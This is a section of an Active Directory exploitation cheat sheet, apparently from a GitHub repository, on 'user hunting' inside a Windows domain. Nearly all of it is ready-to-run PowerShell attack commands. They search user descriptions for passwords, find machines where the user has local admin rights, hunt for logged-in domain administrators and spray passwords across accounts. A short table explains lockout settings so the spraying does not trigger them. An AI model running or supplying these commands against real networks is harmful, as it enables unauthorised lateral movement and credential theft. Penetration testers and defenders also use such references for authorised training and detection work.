## USER HUNTING

---
#### HUNTING JUICY NOTE
```powershell
Find-UserField -SearchField Description -SearchTerm "pass"
Find-UserField -SearchField Description -SearchTerm "admin"
Find-UserField -SearchField Description -SearchTerm "manage"
...
```

---
#### HUNTING ADMIN ACCESS
- Find all machines on the current domain where the current user has local admin access (Get-NetComputer + Invoke-CheckLocalAdminAccess)
```powershell
Find-LocalAdminAccess -Verbose
```

---
#### HUNTING PSREMOTE ACCESS
- Find Administrative access
```powershell
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
# No Stateful
Enter-PSSession -ComputerName targetcomputer.target.domain.local
# Stateful
$sess = New-Pssession -ComputerName targetcomputer.target.domain.local
Enter-Pssession -session $sess
```

---
#### HUNTING WMI ACCESS
- If RPC and SMB are blocked check with WMI
```powershell
. .\Find-WMILocalAdminAccess.ps1
```

---
#### HUNTING ADMIN
- Find local admins on all machines of the domain (Get-NetComputer+Get-
NetLocalGroup)
```powershell
Invoke-EnumerateLocalAdmin -Verbose
```

---
#### HUNTING SESSION
- Find computers where a domain admin (or specified user/group) has sessions
```powershell
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```
- Confirm admin access
```powershell
Invoke-UserHunter -CheckAccess
```

---
#### HUNTING DOMAIN ADMIN
- Find computers where a domain admin is logged-in ( Get-NetSession / Get-NetLoggedon )
```powershell
Invoke-UserHunter -Stealth
```
- WAIT FOR INCOMING SESSINON
```powershell
Invoke-UserHunter -ComputerName targetserver -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

---
#### PASSWORD SPRAYING
```powershell
# CHECK POLICY AND CARE TO NOT LOCK ACCOUNTS
(Get-DomainPolicy)."system access"
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```
:warning: CHECK POLICY AND CARE TO NOT LOCK ACCOUNTS<br />
:warning: VERY NOISY

| Setting Key | Explaination |
|-|-|
| LockoutDuration | The number of minutes that a locked-out account MUST remain locked out before automatically becoming unlocked.<br />-1 = MUST be unclock by admin<br />other = number of minutes|
| LockoutBadCount | Number of failed logon attempts after which a user account MUST be locked out. |
| ResetLockoutCount | Number of minutes after a failed logon attempt that the account MUST be locked out |

#### PWDLASTSET
- Use this command to see the last password set of each user in the current domain
```powershell
Get-UserProperty -Properties pwdlastset
```

---
[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)